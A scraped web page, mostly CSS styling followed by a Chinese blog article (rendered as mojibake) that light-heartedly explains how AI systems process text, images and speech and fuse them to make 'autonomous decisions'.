20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"â";top:8px;left:5px}.markdown-body blockquote:after{content:"â";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>â€œå½“AIå¼€å§‹è‡ªå·±åšå†³å®šï¼Œæˆ‘ä»¬è¦æ‹…å¿ƒçš„ä¸æ˜¯å®ƒæŠ¢å·¥ä½œï¼Œè€Œæ˜¯å®ƒå†™çš„æ–‡æ¡ˆå¯èƒ½æ¯”æˆ‘ä»¬è¿˜æç¬‘ã€‚â€</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ğŸ“˜ ä¸€ã€å‰è¨€ï¼šè®©AIå­¦ä¼šâ€œè‡ªå·±å†³å®šâ€çš„æµªæ¼«ä¸ææ€–</h2>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æ‰“å¼€ä¸€ä¸ªè½¯ä»¶ï¼Œå®ƒä¸å†é—®ä½ â€œæ˜¯å¦ä¿å­˜æ–‡ä»¶â€ï¼Œ<br/>
è€Œæ˜¯çœ‹äº†ä½ ç¥ä¸€çœ¼å±å¹•çš„çœ¼ç¥ã€å¬å‡ºä½ å¹æ°”çš„é¢‘ç‡ã€å†åŠ ä¸Šå‰å‡ å¤©ä½ å‡Œæ™¨ä¸‰ç‚¹è¿˜åœ¨æ”¹ä»£ç çš„è®°å½•â€¦â€¦<br/>
å®ƒå°±<strong>è‡ªå·±å†³å®šå¸®ä½ ä¿å­˜ç„¶åå¼ºåˆ¶ä½ å»ç¡è§‰</strong>ã€‚</p>
<p>ğŸ¤– â€”â€” è¿™ï¼Œå°±æ˜¯â€œAI è‡ªä¸»å†³ç­–â€çš„èŒèŠ½ã€‚</p>
<p>æ‰€è°“ <strong>AI è‡ªä¸»å†³ç­–ï¼ˆAutonomous Decision Makingï¼‰</strong> ï¼Œ<br/>
å¹¶ä¸æ„å‘³ç€AIæœ‰äº†æ„è¯†ï¼Œè€Œæ˜¯èƒ½ï¼š</p>
<ul>
<li>æ ¹æ®è¾“å…¥å†…å®¹ï¼ˆæ–‡æœ¬/å›¾åƒ/è¯­éŸ³ï¼‰ï¼Œ</li>
<li>ä»æ¨¡å‹ä¸ä¸Šä¸‹æ–‡ä¸­æ¨ç†å‡ºæœ€ä¼˜è¡ŒåŠ¨ç­–ç•¥ï¼Œ</li>
<li>å¹¶é€šè¿‡ç­–ç•¥æ‰§è¡Œå™¨ï¼ˆagent/plannerï¼‰å®ç°è¡ŒåŠ¨ã€‚</li>
</ul>
<p>è¿™å¬ä¸Šå»åƒå“²å­¦ï¼Œå®é™…ä¸Šâ€”â€”æ˜¯<strong>ä¸€å †çŸ©é˜µè¿ç®—å’Œå‘é‡ç©ºé—´çš„æµªæ¼«æ‹¼å›¾</strong>ã€‚<br/>
ï¼ˆä½†æˆ‘ä»¬çº¦å®šä¸å†™æ•°å­¦å…¬å¼ğŸ¤«ï¼‰</p>
<hr/>
<h2 data-id="heading-1">ğŸ§  äºŒã€AI å†³ç­–çš„åº•å±‚â€œè„‘å›è·¯â€åŸç†</h2>
<p>AI çš„â€œè‡ªä¸»â€ä¸è¿‡æ˜¯ç¨‹åºåœ¨é«˜ç»´ç©ºé—´ä¸­â€œè‡ªæ°â€çš„ä¸€ç§å¹»è§‰ã€‚<br/>
ä»ç³»ç»Ÿåº•å±‚çœ‹ï¼š</p>
<ol>
<li>
<p><strong>è¾“å…¥å±‚ï¼ˆInputï¼‰</strong> ï¼š<br/>
æ–‡æœ¬ã€å›¾ç‰‡ã€è¯­éŸ³è¢«è½¬åŒ–ä¸ºç»Ÿä¸€çš„æ•°å€¼ç‰¹å¾ã€‚</p>
<ul>
<li>æ–‡æœ¬ â†’ Token Embedding</li>
<li>å›¾ç‰‡ â†’ Vision Encoderï¼ˆå¦‚ViTï¼‰</li>
<li>è¯­éŸ³ â†’ Speech Encoderï¼ˆå¦‚Whisper Encoderï¼‰</li>
</ul>
</li>
<li>
<p><strong>èåˆå±‚ï¼ˆFusionï¼‰</strong> ï¼š<br/>
æ‰€æœ‰æ¨¡æ€å…±åŒæŠ•å°„è¿›åŒä¸€è¯­ä¹‰ç©ºé—´ã€‚<br/>
è¿™ä¸€æ­¥åƒæ˜¯ä¸€ä¸ªAIç‰ˆçš„é…’å§â€”â€”<br/>
æ–‡æœ¬æ˜¯å¥è°ˆçš„è¯—äººï¼Œå›¾åƒæ˜¯å®‰é™çš„ç”»å®¶ï¼Œè¯­éŸ³æ˜¯é‚£ä¸ªçˆ±å”±æ‘‡æ»šçš„ç‰©ç†è€å¸ˆã€‚<br/>
å®ƒä»¬åœ¨è¯­ä¹‰ç©ºé—´å–åˆ°ä¸€èµ·å»äº†ğŸ»ã€‚</p>
</li>
<li>
<p><strong>æ¨ç†å±‚ï¼ˆReasoningï¼‰</strong> ï¼š<br/>
è¿™å°±æ˜¯Transformerä»¬çš„èˆå°ã€‚<br/>
æ¨¡å‹ä¼šåŸºäºâ€œä¸Šä¸‹æ–‡å…³è”â€è®¡ç®—æ¯ä¸ªå¯èƒ½å†³ç­–çš„<strong>ç½®ä¿¡åº¦åˆ†å¸ƒ</strong>ï¼ˆå¯ç†è§£ä¸ºâ€œå®ƒå¤šç›¸ä¿¡è‡ªå·±â€ï¼‰ã€‚<br/>
æœ€ç»ˆçš„é€‰æ‹©æ¥è‡ªäºï¼š</p>
<ul>
<li>å†å²åœºæ™¯è®°å¿†</li>
<li>å¥–åŠ±åé¦ˆï¼ˆReinforcementï¼‰</li>
<li>å†³ç­–æ¸©åº¦ï¼ˆTemperatureï¼‰</li>
</ul>
</li>
<li>
<p><strong>æ‰§è¡Œå±‚ï¼ˆAction Layerï¼‰</strong> ï¼š<br/>
æ¨¡å‹å°†è¾“å‡ºæŒ‡ä»¤æˆ–è¡Œä¸ºï¼ˆç”Ÿæˆæ–‡æœ¬ã€æ§åˆ¶æ¥å£ã€å‘èµ·ä»»åŠ¡è¯·æ±‚ç­‰ï¼‰ã€‚</p>
</li>
</ol>
<hr/>
<h2 data-id="heading-2">ğŸ“¸ ä¸‰ã€æ–‡æœ¬ã€å›¾ç‰‡ã€è¯­éŸ³ï¼šä¸‰å¤§è¾“å…¥æ¨¡æ€çš„äº¤å“æ›²</h2>
<h3 data-id="heading-3">ğŸ™ 1. è¯­éŸ³ -&gt; æ–‡å­—</h3>
<p>è¯­éŸ³è¯†åˆ«ä¸æ˜¯å¬æ‡‚ï¼Œè€Œæ˜¯<strong>é¢‘è°±ç‰¹å¾çš„æ¨¡å¼åŒ¹é…</strong>ã€‚<br/>
AI å¹¶ä¸æ˜¯å¬è§â€œä½ å¥½â€ï¼Œå®ƒåªçŸ¥é“â€”â€”<br/>
â€œåœ¨è¿™ä¸€æ—¶åˆ»çš„å£°æ³¢é¢‘åŸŸå³°å€¼ä¸å·²çŸ¥æ¨¡æ¿å»åˆç¨‹åº¦ = å¾ˆåƒâ€˜ä½ å¥½â€™â€ã€‚</p>
<h3 data-id="heading-4">ğŸ§¾ 2. æ–‡æœ¬ -&gt; è¯­ä¹‰</h3>
<p>æ–‡æœ¬æ˜¯AIä¸–ç•Œçš„DNAï¼Œ<br/>
æ¯ä¸ªè¯éƒ½æ˜¯ä¸€ä¸ªå‘é‡ï¼Œæ¯ä¸ªå¥å­æ˜¯ä¸€æ®µå…³ç³»ç½‘ã€‚<br/>
AI å¹¶ä¸ç†è§£å­—é¢ï¼Œè€Œæ˜¯åœ¨å‘é‡ç©ºé—´ä¸­æ‰¾åˆ°<strong>æœ€æ¥è¿‘â€œæ„ä¹‰â€çš„æ–¹å‘</strong>ã€‚<br/>
ğŸŒˆ <strong>å¯ä»¥ç†è§£ä¸ºï¼šè¯­ä¹‰ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ç©ºé—´åæ ‡çš„å…±é¸£ã€‚</strong></p>
<h3 data-id="heading-5">ğŸ–¼ 3. å›¾ç‰‡ -&gt; è¡¨å¾</h3>
<p>å›¾åƒç‰¹å¾ç»è¿‡å·ç§¯æˆ–è§†è§‰Transformeræå–ï¼Œ<br/>
ç„¶åè½¬åŒ–ä¸ºä¸€ç³»åˆ—çš„â€œå…³é”®è§†è§‰å•å…ƒâ€ã€‚<br/>
æ¯”å¦‚çœ‹åˆ°çŒ«ï¼Œå®ƒä¸ä¼šçœŸçš„çœ‹åˆ°çŒ«ï¼Œè€Œæ˜¯æ•æ‰åˆ°ï¼š</p>
<blockquote>
<p>åœ†å½¢è¾¹ç•Œ + æ¯›å‘çº¹ç† + å¯¹ç§°è€³å½¢ç»“æ„ + å°è€Œé«˜äº®çš„ç³å­”</p>
</blockquote>
<p>ç»“æœå°±æ˜¯ä¸€ä¸ªè®©æœºå™¨èƒ½è¯´â€œåº”è¯¥æ˜¯çŒ«å§ğŸ±â€çš„ç‰¹å¾å‘é‡ã€‚</p>
<hr/>
<h2 data-id="heading-6">ğŸ§© å››ã€å¤šæ¨¡æ€èåˆï¼šè®©æœºå™¨æ‹¥æœ‰â€œæ„Ÿå®˜çš„æ„è¯†â€</h2>
<p>AI è‡ªä¸»å†³ç­–çš„æœ¬è´¨â€”â€”æ˜¯<strong>ç†è§£è·¨æ¨¡æ€ä¸Šä¸‹æ–‡çš„ä¸€è‡´æ€§</strong>ã€‚<br/>
ä¸¾ä¸ªä¾‹å­ ğŸ‘‡</p>
<blockquote>
<p>ç”¨æˆ·å‘æ¥ä¸€å¥è¯ï¼šâ€œè¿™ç”»çœ‹èµ·æ¥æœ‰ç‚¹å­¤ç‹¬ã€‚â€<br/>
åŒæ—¶é™„ä¸Šä¸€å¼ ç°è“è°ƒè¿œå±±å›¾ã€‚</p>
</blockquote>
<p>ç³»ç»Ÿé€šè¿‡ï¼š</p>
<ul>
<li>æ–‡æœ¬è¯­ä¹‰åˆ†æï¼šâ€œå­¤ç‹¬â€æŒ‡æƒ…ç»ªç‰¹å¾</li>
<li>å›¾åƒæƒ…ç»ªç‰¹å¾æå–ï¼šâ€œå†·è‰²è°ƒï¼Œä½é¥±å’Œåº¦â€</li>
</ul>
<p>ğŸŒ« æœ€ç»ˆæ¨¡å‹åˆ¤æ–­ï¼š<br/>
æƒ…ç»ªçŠ¶æ€ä¸€è‡´ï¼Œè§¦å‘â€œå®‰æ…°å‹å¯¹è¯ç­–ç•¥â€ï¼Œç³»ç»Ÿè¾“å‡ºï¼š</p>
<blockquote>
<p>â€œæˆ–è®¸æ­£å› ä¸ºå­¤ç‹¬ï¼Œè¿™å¹…ç”»æ‰æœ‰é‚£ä¹ˆæ·±çš„å‘¼å¸æ„Ÿã€‚â€</p>
</blockquote>
<p>AI å¹¶ä¸æ˜¯æ‡‚äº†å­¤ç‹¬ï¼Œè€Œæ˜¯<strong>å°†ç”¨æˆ·è¾“å…¥çš„ç»Ÿè®¡ç‰¹å¾æ˜ å°„æˆå…±æ„Ÿååº”</strong>ã€‚</p>
<hr/>
